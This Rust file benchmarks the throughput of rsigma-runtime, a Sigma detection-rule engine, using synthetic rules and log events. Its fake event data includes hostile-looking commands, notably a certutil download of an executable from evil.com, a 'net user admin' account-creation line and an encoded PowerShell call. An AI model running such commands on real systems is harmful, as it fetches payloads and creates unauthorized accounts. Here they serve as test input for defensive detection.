//! Runtime throughput benchmarks for rsigma-runtime.
//!
//! Measures the full `LogProcessor` pipeline — parsing, format dispatch, batch
//! evaluation — and compares it against raw `Engine::evaluate` on pre-parsed
//! events. This covers the overhead introduced by the runtime abstraction layer.

use std::sync::Arc;

use criterion::{BenchmarkId, Criterion, black_box, criterion_group, criterion_main};
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};

use rsigma_eval::{CorrelationConfig, Engine, JsonEvent};
use rsigma_parser::parse_sigma_yaml;
use rsigma_runtime::input::SyslogConfig;
use rsigma_runtime::{InputFormat, LogProcessor, NoopMetrics, RuntimeEngine};

const SEED: u64 = 0xDEAD_BEEF_CAFE;

fn rng() -> StdRng {
    StdRng::seed_from_u64(SEED)
}

// ---------------------------------------------------------------------------
// Synthetic data
// ---------------------------------------------------------------------------

const FIELD_NAMES: &[&str] = &[
    "CommandLine",
    "Image",
    "ParentImage",
    "User",
    "EventType",
    "SourceIp",
    "DestinationPort",
];

const STRING_VALUES: &[&str] = &[
    "whoami",
    "cmd.exe",
    "powershell.exe",
    "net.exe",
    "mimikatz",
    "lsass.exe",
    "svchost.exe",
    "rundll32.exe",
];

const MODIFIERS: &[&str] = &["", "|contains", "|startswith", "|endswith"];

fn gen_n_rules(n: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::with_capacity(n);
    for i in 0..n {
        let num_items = rng.random_range(1..=3);
        let mut detection = String::from("    selection:\n");
        for _ in 0..num_items {
            let field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];
            let val = STRING_VALUES[rng.random_range(0..STRING_VALUES.len())];
            let modifier = MODIFIERS[rng.random_range(0..MODIFIERS.len())];
            detection.push_str(&format!("        {field}{modifier}: '{val}'\n"));
        }
        docs.push(format!(
            "title: Bench Rule {i}\n\
             id: bench-rule-{i:06}\n\
             logsource:\n\
             \x20   product: windows\n\
             \x20   category: process_creation\n\
             detection:\n\
             {detection}\
             \x20   condition: selection\n\
             level: medium\n"
        ));
    }
    docs.join("---\n")
}

const IMAGES: &[&str] = &[
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\whoami.exe",
    "/usr/bin/bash",
    "/usr/bin/curl",
];

const COMMANDS: &[&str] = &[
    "whoami /all",
    "cmd.exe /c net user admin P@ss123",
    "powershell.exe -enc SGVsbG8=",
    "certutil -urlcache -split -f http://evil.com/p.exe",
    "notepad.exe readme.txt",
    "systeminfo",
];

fn gen_json_event(rng: &mut StdRng) -> serde_json::Value {
    serde_json::json!({
        "User": format!("user_{}", rng.random_range(0..100u32)),
        "Image": IMAGES[rng.random_range(0..IMAGES.len())],
        "CommandLine": COMMANDS[rng.random_range(0..COMMANDS.len())],
        "ParentImage": IMAGES[rng.random_range(0..IMAGES.len())],
        "SourceIp": format!("10.{}.{}.{}", rng.random_range(0..256u16), rng.random_range(0..256u16), rng.random_range(1..255u16)),
        "DestinationPort": rng.random_range(1..=65535u16),
        "EventType": "process_create",
    })
}

fn gen_json_lines(n: usize) -> Vec<String> {
    let mut rng = rng();
    (0..n)
        .map(|_| serde_json::to_string(&gen_json_event(&mut rng)).unwrap())
        .collect()
}

fn gen_syslog_lines(n: usize) -> Vec<String> {
    let mut rng = rng();
    (0..n)
        .map(|i| {
            let host = format!("web{:02}", i % 10);
            let cmd = COMMANDS[rng.random_range(0..COMMANDS.len())];
            format!("<34>Oct 11 22:14:{:02} {host} sshd[{i}]: {cmd}", i % 60)
        })
        .collect()
}

fn gen_plain_lines(n: usize) -> Vec<String> {
    let mut rng = rng();
    (0..n)
        .map(|_| {
            let cmd = COMMANDS[rng.random_range(0..COMMANDS.len())];
            format!("2024-01-01 00:00:00 INFO process_create {cmd}")
        })
        .collect()
}

fn make_processor(n_rules: usize) -> (LogProcessor, String) {
    let yaml = gen_n_rules(n_rules);
    let dir = tempfile::tempdir().unwrap();
    let rule_path = dir.path().join("bench.yml");
    std::fs::write(&rule_path, &yaml).unwrap();

    let mut engine = RuntimeEngine::new(rule_path, vec![], CorrelationConfig::default(), false);
    engine.load_rules().unwrap();
    std::mem::forget(dir);

    (LogProcessor::new(engine, Arc::new(NoopMetrics)), yaml)
}

// ---------------------------------------------------------------------------
// Benchmark: LogProcessor pipeline throughput across formats
// ---------------------------------------------------------------------------

fn bench_runtime_json_throughput(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_json");
    group.sample_size(20);

    let (processor, _) = make_processor(100);

    for n_events in [1_000, 10_000] {
        let lines = gen_json_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));

        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                let results =
                    processor.process_batch_with_format(black_box(lines), &InputFormat::Json, None);
                black_box(results);
            });
        });
    }

    group.finish();
}

fn bench_runtime_syslog_throughput(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_syslog");
    group.sample_size(20);

    let (processor, _) = make_processor(100);
    let syslog_format = InputFormat::Syslog(SyslogConfig::default());

    for n_events in [1_000, 10_000] {
        let lines = gen_syslog_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));

        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                let results =
                    processor.process_batch_with_format(black_box(lines), &syslog_format, None);
                black_box(results);
            });
        });
    }

    group.finish();
}

fn bench_runtime_plain_throughput(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_plain");
    group.sample_size(20);

    let (processor, _) = make_processor(100);

    for n_events in [1_000, 10_000] {
        let lines = gen_plain_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));

        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                let results = processor.process_batch_with_format(
                    black_box(lines),
                    &InputFormat::Plain,
                    None,
                );
                black_box(results);
            });
        });
    }

    group.finish();
}

fn bench_runtime_auto_throughput(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_auto");
    group.sample_size(20);

    let (processor, _) = make_processor(100);
    let auto_format = InputFormat::default();

    for n_events in [1_000, 10_000] {
        let lines = gen_json_lines(n_events);
        group.throughput(criterion::Throughput::Elements(n_events as u64));

        group.bench_with_input(BenchmarkId::new("events", n_events), &lines, |b, lines| {
            b.iter(|| {
                let results =
                    processor.process_batch_with_format(black_box(lines), &auto_format, None);
                black_box(results);
            });
        });
    }

    group.finish();
}

// ---------------------------------------------------------------------------
// Benchmark: raw Engine::evaluate vs LogProcessor pipeline (overhead measure)
// ---------------------------------------------------------------------------

fn bench_runtime_vs_raw_engine(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_vs_raw");
    group.sample_size(20);

    let n_events = 10_000;
    let n_rules = 100;

    let yaml = gen_n_rules(n_rules);
    let collection = parse_sigma_yaml(&yaml).unwrap();

    let mut rng = rng();
    let event_values: Vec<serde_json::Value> =
        (0..n_events).map(|_| gen_json_event(&mut rng)).collect();
    let json_lines: Vec<String> = event_values
        .iter()
        .map(|v| serde_json::to_string(v).unwrap())
        .collect();

    group.throughput(criterion::Throughput::Elements(n_events as u64));

    // Baseline: raw Engine::evaluate on pre-parsed events
    let mut engine = Engine::new();
    engine.add_collection(&collection).unwrap();
    let events: Vec<JsonEvent> = event_values.iter().map(JsonEvent::borrow).collect();

    group.bench_function("raw_engine", |b| {
        b.iter(|| {
            let mut total = 0usize;
            for event in &events {
                total += engine.evaluate(black_box(event)).len();
            }
            black_box(total);
        });
    });

    // LogProcessor with JSON format (includes parsing overhead)
    let (processor, _) = make_processor(n_rules);

    group.bench_with_input(
        BenchmarkId::new("log_processor", "json"),
        &json_lines,
        |b, lines| {
            b.iter(|| {
                let results =
                    processor.process_batch_with_format(black_box(lines), &InputFormat::Json, None);
                black_box(results);
            });
        },
    );

    // LogProcessor with auto-detect format
    group.bench_with_input(
        BenchmarkId::new("log_processor", "auto"),
        &json_lines,
        |b, lines| {
            b.iter(|| {
                let results = processor.process_batch_with_format(
                    black_box(lines),
                    &InputFormat::default(),
                    None,
                );
                black_box(results);
            });
        },
    );

    group.finish();
}

// ---------------------------------------------------------------------------
// Benchmark: scaling with rule count
// ---------------------------------------------------------------------------

fn bench_runtime_rule_scaling(c: &mut Criterion) {
    let mut group = c.benchmark_group("runtime_rule_scaling");
    group.sample_size(10);

    let n_events = 1_000;
    let lines = gen_json_lines(n_events);

    for n_rules in [100, 500, 1000] {
        let (processor, _) = make_processor(n_rules);
        group.throughput(criterion::Throughput::Elements(n_events as u64));

        group.bench_with_input(BenchmarkId::new("rules", n_rules), &lines, |b, lines| {
            b.iter(|| {
                let results =
                    processor.process_batch_with_format(black_box(lines), &InputFormat::Json, None);
                black_box(results);
            });
        });
    }

    group.finish();
}

// ---------------------------------------------------------------------------
// Criterion harness
// ---------------------------------------------------------------------------

criterion_group!(
    benches,
    bench_runtime_json_throughput,
    bench_runtime_syslog_throughput,
    bench_runtime_plain_throughput,
    bench_runtime_auto_throughput,
    bench_runtime_vs_raw_engine,
    bench_runtime_rule_scaling,
);
criterion_main!(benches);
